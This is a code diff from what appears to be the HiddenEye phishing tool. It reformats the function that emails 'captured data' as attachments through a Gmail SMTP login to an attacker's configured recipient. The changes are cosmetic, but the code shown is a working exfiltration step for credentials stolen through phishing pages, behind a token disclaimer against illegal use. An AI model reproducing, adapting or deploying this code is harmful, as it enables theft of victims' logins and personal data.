@@ -31,8 +31,7 @@ def main():
 
     outer = MIMEMultipart()
     outer[
-        "Subject"
-    ] = "[ HIDDENEYE ]:: HERE IS YOUR CAPTURED DATA. (We don't support Illegal Use of Tool)"
+        "Subject"] = "[ HIDDENEYE ]:: HERE IS YOUR CAPTURED DATA. (We don't support Illegal Use of Tool)"
     outer["To"] = emailconfig.recipient_email
     outer["From"] = emailconfig.gmail_account
     outer.preamble = ""
@@ -52,13 +51,14 @@ def main():
                 msg = MIMEBase("application", "octet-stream")
                 msg.set_payload(fp.read())
             encoders.encode_base64(msg)
-            msg.add_header(
-                "Content-Disposition", "attachment", filename=os.path.basename(file)
-            )
+            msg.add_header("Content-Disposition",
+                           "attachment",
+                           filename=os.path.basename(file))
 
             outer.attach(msg)
         except:
-            print("[.] Unable to open one of the attachments. Error Occured ! ")
+            print(
+                "[.] Unable to open one of the attachments. Error Occured ! ")
             raise
 
     composed = outer.as_string()
@@ -73,7 +73,8 @@ def main():
             s.login(emailconfig.gmail_account, gmail_password)
             print("[.] Login : SUCCESS")
             print("[.] Sending Captured Data to Recipient Email Address...")
-            s.sendmail(emailconfig.gmail_account, emailconfig.recipient_email, composed)
+            s.sendmail(emailconfig.gmail_account, emailconfig.recipient_email,
+                       composed)
             print("[.] EMAIL SEND : SUCCESS")
             s.close()
         print("")
